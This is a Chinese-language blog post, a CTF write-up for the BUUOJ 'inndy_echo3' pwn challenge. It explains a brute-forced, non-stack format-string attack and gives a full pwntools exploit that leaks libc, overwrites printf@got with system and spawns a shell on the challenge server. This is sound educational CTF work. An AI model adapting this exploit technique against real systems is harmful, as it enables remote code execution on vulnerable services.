<!doctype html><html><head lang=en><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>BUU-inndy_echo3-WP - blog of chuj</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板"><meta property="og:image" content><meta property="og:title" content="BUU-inndy_echo3-WP"><meta property="og:description" content="虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板"><meta property="og:type" content="article"><meta property="og:url" content="https://www.cjovi.icu/wp/1012.html"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-01-16T15:01:03+00:00"><meta property="article:modified_time" content="2021-01-16T15:01:03+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="BUU-inndy_echo3-WP"><meta name=twitter:description content="虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。 这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板"><script src=https://www.cjovi.icu/js/feather.min.js></script>
<link href=https://www.cjovi.icu/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=https://www.cjovi.icu/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/katex.min.js></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.2/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script>
<script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}]})})</script><link rel=stylesheet type=text/css href=https://www.cjovi.icu/css/font.e98a2c89163f90d6fa6d8baf5a50a6561f8ff3d0be1551265f364d138d75df33.css></head><body><div class=content><header><div class=main><a href=https://www.cjovi.icu/>blog of chuj</a></div><nav><a href=/>Home</a>
<a href=/posts.html>All posts</a>
<a href=/about.html>About</a>
<a href=/tags.html>Tags</a></nav></header><main><article><div class=title><h1 class=title>BUU-inndy_echo3-WP</h1><div class=meta>Posted on Jan 16, 2021</div></div><section class=body><p>虽然马上就要期末考了，我应该好好复习数分，但是还是没忍住，花了不少时间pwn了这题。</p><p>这是我做过的最麻烦的fmt，知识并没有新增，还是“搭跳板”，但是由于要爆破，之前就一直没做，今天突然想起来，莫名其妙的胸有成竹了起来，就试着pwn了一下</p><h3 id=前置知识>前置知识</h3><p>不在栈上的格式化字符串利用方法。我写过两篇wp对此方法进行了分析，这里就不在说了</p><ul><li><a href=https://www.cjovi.icu/WP/buu-xman_2019_format-wp.html>BUU-xman_2019_format-WP</a></li><li><a href=https://www.cjovi.icu/WP/979.html>KCTF-前世今生（PWN）/ASIS CTF Finals 2016 Heapstorm-WP</a></li></ul><h3 id=特点>特点</h3><p>栈被随机了</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/1742221062.png></div><p><code>alloca</code>是一个在栈上动态分配内存的函数，相比起<code>malloc</code>肯定是要快上不少，但是种种原因都使得这个函数不被建议使用，不过这毕竟是题目，也就不管太多了。<code>buf</code>是一个随机数，然后通过一段奇怪的表达式申请了内存</p><p>写个脚本跑跑看</p><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span>poss <span style=color:#666>=</span> <span style=color:#007020>set</span>()
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>for</span> i <span style=color:#007020;font-weight:700>in</span> <span style=color:#007020>range</span>(<span style=color:#40a070>0</span>,<span style=color:#40a070>1000000</span>):
</span></span><span style=display:flex><span>    poss<span style=color:#666>.</span>add(<span style=color:#40a070>16</span><span style=color:#666>*</span>(((i <span style=color:#666>&amp;</span> <span style=color:#40a070>0x3039</span>) <span style=color:#666>+</span> <span style=color:#40a070>30</span>)<span style=color:#666>/</span><span style=color:#40a070>0x10</span>))
</span></span><span style=display:flex><span>    poss <span style=color:#666>=</span> <span style=color:#007020>set</span>(poss)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020>print</span> <span style=color:#007020>list</span>(poss)
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># chuj @ cmp1 in ~/buu [14:31:45]</span>
</span></span><span style=display:flex><span>$ python echo3_test_possibility.py
</span></span><span style=display:flex><span><span style=color:#666>[</span>64, 8224, 48, 4128, 4160, 80, 12304, 4176, 4112, 32, 8272, 8208, 12336, 12368, 4144, 8240, 8256, 12352, 12320, 16<span style=color:#666>]</span>
</span></span></code></pre></div><p>发现结果是有限的，那么可以考虑爆破。</p><h3 id=利用方法>利用方法</h3><h4 id=准备工作>准备工作</h4><p>栈的结构是利用的关键，我们需要尽可能地还原，buu提供了libc，我们可以通过patchelf的方法实现libc版本的一致。在<a href=https://www.cjovi.icu/pwnreview/941.html>这篇文章</a>里面我记录了详细的方法（主要是旧版本ld的编译和patchelf的使用）。</p><h4 id=动调分析>动调分析</h4><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/23350059.png></div><p><code>alloca</code>似乎是内联的，直接对esp进行sup，我们把断点下在这里，用<code>set $eax=0x20</code>的方式指定eax为32，作为我们爆破时期望的随机值（别的值也可以，<code>0x20</code>兼顾了查看栈的方便和较高的概率）。然后在在<code>hardfmt</code>函数中的<code>printf</code>处下断点，观察栈</p><div style=text-align:center><img src=https://www.cjovi.icu/usr/uploads/2021/01/1163839997.png></div><p>蓝色框可以leak libc基地址，ebp指向的内存可以leak stack，橙色框提供了两个跳板，由于我们只有五次格式化字符串攻击的机会，就需要同时利用这两个链进行攻击。红色框中有两个高二字节为<code>0x804</code>的内存单元（和<code>printf@got</code>的高字节相同），我们利用橙框中的两个链修改这两个单元为<code>&amp;printf@got</code>和<code>&amp;printf@got + 2</code>，就可以实现覆写<code>printf@got</code>为<code>system</code>，然后传入<code>"/bin/sh\x00"</code>就可以getshell了。</p><h3 id=exp>exp</h3><div class=highlight><pre tabindex=0 style=background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#60a0b0;font-style:italic>#!/usr/bin/env python</span>
</span></span><span style=display:flex><span><span style=color:#60a0b0;font-style:italic># coding=utf-8</span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>from</span> <span style=color:#0e84b5;font-weight:700>pwn</span> <span style=color:#007020;font-weight:700>import</span> <span style=color:#666>*</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>libc <span style=color:#666>=</span> ELF(<span style=color:#4070a0>&#34;./libcs/buu-32-libc.so&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#007020;font-weight:700>while</span> <span style=color:#007020;font-weight:700>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>try</span>:
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic>#sh = process(&#34;./echo3&#34;)</span>
</span></span><span style=display:flex><span>        sh <span style=color:#666>=</span> remote(<span style=color:#4070a0>&#34;node3.buuoj.cn&#34;</span>,<span style=color:#40a070>28897</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;%43$p&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;libc_end&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%18$p&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;stack_end&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        libc_base <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;libc_end&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span><span style=color:#40a070>16</span>) 
</span></span><span style=display:flex><span>        libc_base <span style=color:#666>-=</span> (libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;__libc_start_main&#34;</span>] <span style=color:#666>+</span> <span style=color:#40a070>247</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;libc_base:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(libc_base)<span style=color:#60a0b0;font-style:italic># leak the libc_base</span>
</span></span><span style=display:flex><span>        got_addr <span style=color:#666>=</span> <span style=color:#007020>int</span>(sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;stack_end&#34;</span>,drop <span style=color:#666>=</span> <span style=color:#007020;font-weight:700>True</span>),base <span style=color:#666>=</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> <span style=color:#40a070>4</span> <span style=color:#666>*</span> (<span style=color:#40a070>0x2a</span> <span style=color:#666>-</span> <span style=color:#40a070>0x14</span>)
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> <span style=color:#4070a0>&#34;got_addr:</span><span style=color:#4070a0;font-weight:700>\t</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>hex</span>(got_addr)<span style=color:#60a0b0;font-style:italic># leak the got_addr</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#34;%&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(got_addr <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;c&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%30$hn&#34;</span> <span style=color:#60a0b0;font-style:italic># point to got</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%4c</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%31$hn-end&#34;</span> <span style=color:#60a0b0;font-style:italic># point to magic</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-end&#34;</span>)
</span></span><span style=display:flex><span>        payload <span style=color:#666>=</span> <span style=color:#4070a0>&#34;%&#34;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(<span style=color:#40a070>0xA014</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#34;c&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%87$hn&#34;</span> <span style=color:#60a0b0;font-style:italic>#change printf@got</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;</span><span style=color:#70a0d0>%2c</span><span style=color:#4070a0>&#34;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%85$hn-end&#34;</span> <span style=color:#60a0b0;font-style:italic>#change printf@got + 2</span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-end&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#60a0b0;font-style:italic># above got the ability to overwrite printf@got</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        system <span style=color:#666>=</span> libc_base <span style=color:#666>+</span> libc<span style=color:#666>.</span>symbols[<span style=color:#4070a0>&#34;system&#34;</span>]
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>if</span>((system <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>) <span style=color:#666>&gt;</span> (system <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>)):
</span></span><span style=display:flex><span>            payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(system <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%20$hn&#34;</span>
</span></span><span style=display:flex><span>            payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>((system <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>) <span style=color:#666>-</span> (system <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>)) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%21$hn&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>            payload <span style=color:#666>=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>(system <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%21$hn&#34;</span>
</span></span><span style=display:flex><span>            payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#39;%&#39;</span> <span style=color:#666>+</span> <span style=color:#007020>str</span>((system <span style=color:#666>&amp;</span> <span style=color:#40a070>0xFFFF</span>) <span style=color:#666>-</span> (system <span style=color:#666>&gt;&gt;</span> <span style=color:#40a070>16</span>)) <span style=color:#666>+</span> <span style=color:#4070a0>&#39;c&#39;</span> <span style=color:#666>+</span> <span style=color:#4070a0>&#34;%20$hn&#34;</span>
</span></span><span style=display:flex><span>        payload <span style=color:#666>+=</span> <span style=color:#4070a0>&#34;-end&#34;</span>
</span></span><span style=display:flex><span>        <span style=color:#007020>print</span> payload
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(payload)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>recvuntil(<span style=color:#4070a0>&#34;-end&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>sendline(<span style=color:#4070a0>&#34;/bin/sh</span><span style=color:#4070a0;font-weight:700>\x00</span><span style=color:#4070a0>&#34;</span>)
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>interactive()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>except</span>:
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span><span style=display:flex><span>    <span style=color:#007020;font-weight:700>else</span>:
</span></span><span style=display:flex><span>        sh<span style=color:#666>.</span>close()
</span></span></code></pre></div><p>最近比较忙，这篇wp就只简单的写了下思路，没有特别详细。</p><p>我终于做完echo系列的3道题啦！</p><h3 id=特别感谢>特别感谢</h3><p>主要参考了<a href=http://liul14n.top/2020/03/16/Hackme-inndy-echo-echo2-echo3/>[Hackme.inndy]echo/echo2/echo3</a>，从中我学到了很多。</p></section><div class=post-tags><nav class="nav tags"><ul class=tags><li><a href=/tags/write-up>write-up</a></li></ul></nav></div></article></main><footer><div style=display:flex><a class=soc href=https://github.com/chujDK rel=me title=GitHub><i data-feather=github></i></a>
<a class=border></a><a class=soc href=https://twitter.com/jchu95495236 rel=me title=Twitter><i data-feather=twitter></i></a>
<a class=border></a></div><div class=footer-info>2023 <a href=https://github.com/athul/archie>Archie Theme</a> | Built with <a href=https://gohugo.io>Hugo</a></div></footer><script>feather.replace()</script></div></body></html>